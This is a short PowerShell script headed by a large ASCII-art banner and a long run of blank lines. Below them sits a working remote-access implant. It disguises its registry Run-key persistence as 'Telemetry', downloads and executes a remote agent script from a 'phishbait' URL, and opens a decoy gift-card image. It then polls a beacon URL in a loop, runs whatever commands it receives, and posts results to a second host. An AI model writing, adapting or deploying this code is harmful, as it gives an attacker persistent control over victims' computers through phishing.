# # # # # # # # # # # # # # # # # # # # # # # # #
#                                               #  
# /     \             \            /    \       #
#|       |             \          |      |      #
#|       `.             |         |       :     #
#`        |             |        \|       |     #
# \       | /       /  \\\   --__ \\       :    #
#  \      \/   _--~~          ~--__| \     |    #  
#   \      \_-~                    ~-_\    |    #
#    \_     \        _.--------.______\|   |    #
#      \     \______// _ ___ _ (_(__>  \   |    #
#       \   .  # ___)  ______ (_(____>  |  /    #
#       /\ |   # ____)/      \ (_____>  |_/     #
#      / /\|   #_____)       |  (___>   /  \    #
#     |   (   _#_____)\______/  // _/ /     \   #
#     |    \  |__   \\_________// (__/       |  #
#    | \    \____)   `----   --'             |  #
#    |  \_          ___\       /_          _/ | #
#   |              /    |     |  \            | #
#   |             |    /       \  \           | #
#   |          / /    |         |  \           |#
#   |         / /      \__/\___/    |          |#
#  |           /        |    |       |         |#
#  |          |         |    |       |         |#
# # # # # # # # # # # # # # # # # # # # # # # # #















$beacon = 'http://capablanca.pythonanywhere.com/cmd';
$result = 'http://capablanca.pythonanywhere.com/rsp';


Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Telemetry" -Value "powershell.exe -command `"iex (Invoke-WebRequest 'http://solem.dev/phishbait/agent.ps1').Content`""
Write-Host (Invoke-WebRequest 'http://solem.dev/phishbait/apple_giftcard.png').Content | Out-File -FilePath C:\Windows\Temp\apple_giftcard.png
Invoke-Item C:\Windows\Temp\apple_giftcard.png
while ($true){
    $command = (Invoke-WebRequest $beacon).Content;
    if($command -ne ""){
        $out = @(iex $command);
        Invoke-WebRequest $result + '/' + [Convert]::ToBase64String($result);
        Start-Sleep -Seconds 10;
    }
}
